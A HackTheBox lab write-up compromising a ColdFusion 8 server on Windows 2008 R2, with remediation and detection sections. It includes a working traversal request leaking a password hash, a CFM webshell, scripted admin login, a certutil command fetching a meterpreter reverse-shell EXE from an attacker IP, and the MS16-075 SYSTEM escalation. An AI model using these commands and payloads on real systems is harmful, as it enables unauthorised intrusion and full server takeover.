---
layout: default
title: "HackTheBox - Arctic"
---

# HackTheBox - Arctic

**OS:** Windows Server 2008 R2 (x64, build 6.1.7600)

Arctic is a Windows Server 2008 R2 box running Adobe ColdFusion 8 on port 8500. Initial
access chains two CVEs: CVE-2010-2861, a directory traversal in the ColdFusion admin
locale parameter that leaks the SHA1 password hash from `password.properties`, and
authenticated ColdFusion scheduled-task abuse to deploy a CFM webshell to the wwwroot.
A stageless Meterpreter EXE is downloaded via `certutil` and executed from the webshell
for a stable initial session as `ARCTIC\tolis`. Privilege escalation uses MS16-075
(Juicy Potato via MSF `ms16_075_reflection_juicy`) against `SeImpersonatePrivilege`,
reaching `NT AUTHORITY\SYSTEM`. Sliver beacon delivery was attempted but is not viable:
Sliver 1.7.3 compiles beacons with Go 1.25, which dropped Windows 2008 R2 support (Go
1.21+ minimum is Windows 10/Server 2019).

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (ARCTIC) |
| OS | Windows Server 2008 R2 (x64, build 6.1.7600) |
| Initial Access | CVE-2010-2861 path traversal + CF8 scheduled-task webshell |
| Privilege Escalation | MS16-075 SeImpersonatePrivilege via `ms16_075_reflection_juicy` |
| Final Access | `NT AUTHORITY\SYSTEM` |

---

## Recon

### Port Scan

Three ports are open: 135 (RPC), 8500 (ColdFusion HTTP), and 49154 (RPC dynamic).

```text
$ nmap -sCV -p135,8500,49154 <target-ip>
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
|_http-title: _
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Port 8500 is the ColdFusion admin/application server. Browsing to `http://<target-ip>:8500/`
redirects to the CFIDE directory listing. The admin panel is at
`/CFIDE/administrator/enter.cfm`.

---

## Initial Access

### CVE-2010-2861: ColdFusion 8 Directory Traversal (Hash Leak)

ColdFusion 8 (and earlier) passes a `locale` parameter through the admin panel without
sanitisation. The locale value is used to construct a file path for a language resource.
By appending a null byte (`%00`) after the traversal sequence, the path suffix (`.cfm`) is
stripped, allowing arbitrary files to be read.

> **Why this works:** ColdFusion 8 builds the resource path as
> `<cf-root>/lib/<locale>.properties`. The null byte terminates the string at the OS level
> before the `.properties` suffix is appended, so the file resolved is exactly what the
> traversal sequence points to. No authentication is required.

The hash is stored in `password.properties` relative to the CF install root.
On a default Windows install the traversal depth is 8 levels from the locale directory:

```text
$ curl -s "http://<target-ip>:8500/CFIDE/administrator/enter.cfm?\
locale=../../../../../../../lib/password.properties%00en" | grep -i password

rdspassword=0EB5760C59A31283DA6C4B89A1CA67A1A1698A:1
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=false
```

The `password` field is a plain SHA1 of the admin password. Crack it with hashcat:

```text
$ echo "2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03" > cf8.hash
$ hashcat -m 100 cf8.hash /usr/share/wordlists/rockyou.txt --show
2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03:happyday
```

Password: `happyday`.

---

### ColdFusion 8 Admin Login (HMAC-SHA1 with Uppercase Constraint)

The CF8 admin login does not POST the plaintext password. It uses JavaScript
(`/CFIDE/administrator/sha1.js`, Paul Johnston's SHA1 library) to compute
`hex_hmac_sha1(salt, hex_sha1(password))` client-side before submission. A server-generated
`salt` value is embedded in the login page on each load.

> **Gotcha worth recording:** `sha1.js` is configured with `var hexcase = 1`, which means
> ALL hex output is **uppercase**. Both the SHA1 of the password (the HMAC message) and
> the final HMAC result must be uppercase when submitted. Using lowercase hex for either
> value causes authentication to silently fail even with the correct password.

Replicate the login in Python:

```python
import hmac, hashlib, requests, re

TARGET = "http://<target-ip>:8500"
s = requests.Session()

# Fetch salt from the login page
r = s.get(f"{TARGET}/CFIDE/administrator/enter.cfm", timeout=30)
salt = re.search(r'name="salt"[^>]*value="([^"]+)"', r.text).group(1)

# SHA1 of password -- MUST BE UPPERCASE (hexcase=1 in sha1.js)
sha1_up = hashlib.sha1(b"happyday").hexdigest().upper()
# HMAC-SHA1(key=salt, msg=sha1_up) -- result also MUST BE UPPERCASE
hmac_r = hmac.new(salt.encode(), sha1_up.encode(), hashlib.sha1).hexdigest().upper()

r2 = s.post(f"{TARGET}/CFIDE/administrator/enter.cfm", data={
    'cfadminUserId': 'admin',
    'cfadminPassword': hmac_r,
    'requestedURL': '/CFIDE/administrator/enter.cfm?',
    'salt': salt,
    'submit': 'Login',
}, timeout=30, allow_redirects=False)

# Confirm auth: CFAUTHORIZATION_cfadmin cookie is non-trivial
auth_cookie = s.cookies.get('CFAUTHORIZATION_cfadmin', '')
print("Auth:", "OK" if len(auth_cookie) > 10 else "FAIL")
```

```text
Auth: OK
```

The CF admin panel also uses a frames layout (`index.cfm` is a frameset). The scheduler
lives at `/CFIDE/administrator/scheduler/scheduletasks.cfm` (discovered from the `navserver.cfm`
navigation frame), not at the paths documented in older references.

---

### Scheduled Task Webshell Deployment

ColdFusion's scheduler can fetch a remote URL and optionally save the response body to a
file path on the server. This is the standard CF8 webshell delivery path.

Prepare a minimal CFM webshell on the attack box:

```cfm
<cfif isDefined("URL.cmd")>
<cfexecute name="cmd.exe" arguments="/c #URL.cmd#" variable="out" timeout="30"></cfexecute>
<cfoutput>#HTMLEditFormat(out)#</cfoutput>
</cfif>
```

Serve it:

```text
$ python3 -m http.server 8889
```

Create the scheduled task via the CF admin API. The correct form fields (discovered from
`/CFIDE/administrator/scheduler/scheduleedit.cfm`) include the locale-aware date format
(the server reports `el_GR` locale, so `Start_Date` uses the Greek date string returned
by the form itself) and 24-hour time:

```python
r_edit = s.get(f"{TARGET}/CFIDE/administrator/scheduler/scheduleedit.cfm")
cur_date = re.search(r'name="Start_Date"[^>]*value="([^"]*)"', r_edit.text).group(1)
# e.g. "28 Ιουν 2026"

s.post(f"{TARGET}/CFIDE/administrator/scheduler/scheduleedit.cfm", data={
    'adminsubmit': 'Submit',
    'TaskName': 'shelldeploy',
    'Start_Date': cur_date,          # Use the locale-native date from the form
    'End_Date': '',
    'ScheduleType': 'Once',
    'StartTimeOnce': '22:00',        # 24-hour format required
    'Operation': 'HTTPRequest',
    'ScheduledURL': 'http://10.10.16.21:8889/shell.cfm',
    'Request_Time_out': '60',
    'publish': '1',
    'publish_file': 'C:\\ColdFusion8\\wwwroot\\shell.cfm',
    'ResolveURL': '0',
    'taskNameOrig': '',
})
```

> **Gotcha worth recording:** The CF8 admin date-validation is locale-aware. Submitting a
> US-format date (`06/27/2026`) on a Greek-locale CF install triggers "invalid Start Date"
> even though the underlying ColdFusion date parser accepts both. Read `Start_Date`'s
> current value from the form and submit it back unchanged. Likewise, the time format
> error message explicitly says "24 h" -- use `HH:MM`, not `hh:mm AM/PM`.

Trigger the task to run immediately:

```python
s.get(f"{TARGET}/CFIDE/administrator/scheduler/scheduletasks.cfm?action=runtask&task=shelldeploy")
```

Verify the webshell landed:

```text
$ curl "http://<target-ip>:8500/shell.cfm?cmd=whoami"

arctic\tolis
```

---

### Meterpreter Shell via certutil Download

Generate a stageless Meterpreter EXE:

```text
$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.16.21 LPORT=4444 -f exe -o /tmp/met_arctic.exe
Payload size: 199238 bytes
Final size of exe file: 206336 bytes
```

Start a handler:

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.16.21
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > run -j
[*] Started reverse TCP handler on 10.10.16.21:4444
```

Download the EXE to the target via `certutil` (available on Windows 2008 R2+):

```text
$ curl "http://<target-ip>:8500/shell.cfm?cmd=certutil+-urlcache+-split+-f+\
http://10.10.16.21:8080/met_arctic.exe+C:\\Windows\\Temp\\ma.exe"

****  Online  ****
  000000  ...
  032600
CertUtil: -URLCache command completed successfully.
```

Execute:

```text
$ curl "http://<target-ip>:8500/shell.cfm?cmd=C:\\Windows\\Temp\\ma.exe"
[connection hangs -- meterpreter callback]
```

```text
[*] Meterpreter session 24 opened (10.10.16.21:4444 -> <target-ip>:49305)
```

```text
meterpreter > getuid
Server username: ARCTIC\tolis

meterpreter > sysinfo
Computer        : ARCTIC
OS              : Windows Server 2008 R2 (6.1 Build 7600).
Architecture    : x64
System Language : el_GR
Meterpreter     : x86/windows
```

---

## Post-Exploitation Enumeration

```text
meterpreter > getprivs
Enabled Process Privileges
==========================
Name
----
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseWorkingSetPrivilege
```

`SeImpersonatePrivilege` is the escalation vector. The session is x86 on an x64 OS;
migrate to a native x64 process first:

```text
meterpreter > migrate 1132    (jrunsvc.exe, x64, ARCTIC\tolis)
[*] Migrating from 3444 to 1132...
[*] Migration completed successfully.

meterpreter > sysinfo
...
Meterpreter     : x64/windows
```

---

## Privilege Escalation

### MS16-075: SeImpersonatePrivilege via Reflection (`ms16_075_reflection_juicy`)

MS16-075 exploits a privilege escalation in the Windows NTLM reflection path. The
`ms16_075_reflection_juicy` Metasploit module implements the "Juicy Potato" technique
without requiring an external binary: it injects a reflective DLL into `notepad.exe`,
which coerces the SYSTEM NTLM token via a named pipe impersonation chain, then spawns a
new Meterpreter session as `NT AUTHORITY\SYSTEM`.

> **Why this works:** `SeImpersonatePrivilege` allows a process to impersonate a client
> that connects to a named pipe it controls. The DCOM/NTLM reflection trick coerces the
> local SYSTEM account to authenticate over that pipe. On Windows 2008 R2 with no patches
> (build 7600), this chain is reliable.

```text
msf6 > use exploit/windows/local/ms16_075_reflection_juicy
msf6 exploit(ms16_075_reflection_juicy) > set SESSION 24
msf6 exploit(ms16_075_reflection_juicy) > set LHOST 10.10.16.21
msf6 exploit(ms16_075_reflection_juicy) > set LPORT 5555
msf6 exploit(ms16_075_reflection_juicy) > set payload windows/x64/meterpreter_reverse_tcp
msf6 exploit(ms16_075_reflection_juicy) > run
[+] Target appears to be vulnerable (Windows Server 2008 R2)
[*] Launching notepad to host the exploit...
[+] Process 3900 launched.
[*] Reflectively injecting the exploit DLL into 3900...
[*] Injecting exploit into 3900...
[*] Exploit injected. Injecting exploit configuration into 3900...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 25 opened (10.10.16.21:5555 -> <target-ip>:49334)
```

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Read the flags:

```text
meterpreter > cat "C:\Users\tolis\Desktop\user.txt"
<user-flag-redacted>

meterpreter > cat "C:\Users\Administrator\Desktop\root.txt"
<root-flag-redacted>
```

---

## Post-Exploitation: C2 (Sliver)

Sliver beacon delivery is not viable on this target. Sliver 1.7.3 compiles beacons
with **Go 1.25**, which raised the minimum supported Windows version to Windows 10 /
Windows Server 2019 (Go 1.21 dropped Windows 7 / Server 2008 R2 support). The beacon EXE
was successfully uploaded via the SYSTEM Meterpreter session and executed (process
created), but it exits immediately: the Go runtime checks the Windows version at startup
and aborts on pre-Windows-10 systems. No network connection attempt reaches the listener.

Diagnosis: `strings beacon.exe | grep "^go1."` showed `go1.25.6` embedded in the binary.
The beacon process (PID 3720) appeared in `ps` for less than one second then vanished,
with no connection to the Sliver HTTPS listener (port 443) or HTTP listener (port 7777)
as confirmed by `ss` on the attack box.

This is the same constraint as Grandpa (Windows Server 2003 SP2). Any target older than
Windows 10 / Server 2019 needs a C2 framework compiled with Go 1.20 or earlier, or a
non-Go C2.

---

## Root Cause

Two independent weaknesses chained to reach SYSTEM:

1. **CVE-2010-2861 (path traversal):** ColdFusion 8 passes a locale parameter directly
   into a file path without sanitising `../` sequences or enforcing a root boundary. A
   null-byte terminates the `.properties` suffix, granting unauthenticated read of any
   file accessible to the CF process.

2. **Authenticated scheduler abuse:** The ColdFusion admin scheduler can write arbitrary
   content to any path writable by the CF service account by fetching a remote URL and
   saving it as a file. An attacker with admin credentials can deploy an executable
   ColdFusion page to the wwwroot.

3. **SeImpersonatePrivilege on an unpatched OS:** The CF service account `tolis` holds
   `SeImpersonatePrivilege`. Windows Server 2008 R2 RTM (build 7600, no SPs applied)
   is vulnerable to MS16-075, allowing any process with this privilege to reach SYSTEM.

---

## Impact

An unauthenticated remote attacker can:
- Read any file on the server accessible to the ColdFusion process (CVE-2010-2861),
  including credentials, application secrets, and OS config files.
- Obtain the ColdFusion admin password hash, crack it offline, and authenticate as admin.
- Deploy server-side code to the wwwroot via the scheduler, achieving remote code
  execution under the CF service account.
- Escalate to `NT AUTHORITY\SYSTEM` via a local privilege escalation on the unpatched OS.

---

## Remediation

1. **Upgrade or patch ColdFusion 8** -- CVE-2010-2861 is patched in ColdFusion 8.0.1
   hotfix (APSB10-18). ColdFusion 8 is end-of-life; upgrade to a supported version.
   Until patched, restrict access to `/CFIDE/` at the web server or firewall layer.
2. **Rotate the CF admin password** -- the SHA1 hash was crackable from rockyou. Use a
   strong random credential and store it in a secrets manager, not in a world-readable
   properties file.
3. **Restrict ColdFusion scheduler** -- disable or require approval for tasks that write
   files to the wwwroot. Restrict the CF service account's write permissions to application
   directories, not the entire webroot.
4. **Apply all Windows Server 2008 R2 service packs and patches** -- build 7600 (no SPs)
   is missing 15+ years of security patches. MS16-075 is one of dozens of LPEs addressed
   since RTM. At minimum apply SP1 and the subsequent patch rollups; migrate to a supported
   OS version (Windows Server 2022 or later).
5. **Enforce least-privilege for service accounts** -- `SeImpersonatePrivilege` should
   not be held by an application service account unless strictly required. Running
   ColdFusion under a dedicated low-privilege account without impersonation rights removes
   the MS16-075 surface.

### Validation

- CVE-2010-2861: `curl "<cf-url>/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en"` should return a 404 or an empty/generic response, not the contents of `password.properties`.
- Scheduler write: After fixing webroot write permissions, create a test task pointing to a restricted directory and confirm it fails with access-denied.
- LPE: `whoami /priv` from the CF service account should not include `SeImpersonatePrivilege`.

---

## Detection Opportunities

| Signal | Source |
|---|---|
| HTTP GET to `/CFIDE/administrator/enter.cfm` with `locale=../` in query string | IIS / CF access logs |
| Multiple POST requests to `/CFIDE/administrator/enter.cfm` with varying `salt` (brute or scripted login) | CF access logs |
| ColdFusion scheduled task created or modified via admin panel | CF admin audit log (`cf_audit.log`) |
| CF service account making outbound HTTP connections to unusual hosts | Windows Firewall / proxy logs |
| `certutil.exe -urlcache` spawned under IIS worker or CF JVM process | Windows Event ID 4688, Sysmon EventID 1 |
| `ma.exe` / untrusted PE executed from `C:\Windows\Temp\` | Windows Defender / AV, Sysmon EventID 1 |
| Named-pipe impersonation by a non-SYSTEM service process (MS16-075) | Sysmon EventID 17/18 (pipe create/connect) |

---

## Lessons Learned

- **ColdFusion null-byte path traversal is a classic**: any parameter used to construct a
  file path and appended with a fixed extension is potentially traversable via `%00`. Audit
  any framework that does locale/template resolution this way.
- **CF8 admin login HMAC has an uppercase constraint**: `sha1.js` with `hexcase=1` means
  both the SHA1 message and the HMAC digest must be uppercase. Lowercase fails silently.
  When scripting CF8 logins, call `.upper()` on both values.
- **CF admin frames layout**: the CF8 admin is a frameset. Scheduler and other endpoints
  are served from subdirectory CFMs revealed in `navserver.cfm`, not at paths commonly
  cited in older references. Enumerate the frames before guessing paths.
- **Locale-aware date validation**: CF8 date fields are validated against the server's
  locale. Submitting a US-format date to a Greek-locale CF instance triggers a validation
  error. Read and echo back the form's current `Start_Date` value.
- **Go 1.21+ dropped Windows 2008 R2**: Sliver and any other Go-compiled C2 or tool built
  with Go 1.21 or later will not run on Windows 7 / Server 2008 R2 or older. Check the Go
  version embedded in the binary (`strings | grep "^go1."`) before uploading to a legacy
  target.

---

## Cleanup

```text
[ ] MSF sessions 24, 25 terminated; handlers (port 4444, 5555) stopped
[ ] CF scheduled task "shelldeploy" left on target (resets with box); would delete via
    scheduler UI or by removing from CF admin in a real engagement
[ ] Artifacts on target: C:\Windows\Temp\ma.exe, beacon64.exe, bh.exe, bh7.exe,
    shell.cfm in wwwroot -- all left as read-only evidence; would wipe in real engagement
[ ] http.server (port 8889) stopped; Sliver HTTP listener (port 7777) killed
[ ] htb stop to terminate the box
```

Sliver C2 note: beacon delivery was attempted twice (HTTPS/443 and HTTP/7777) and
diagnosed as a Go runtime incompatibility. No C2 session was established. All beacon
processes exited within one second of launch with no network callbacks.
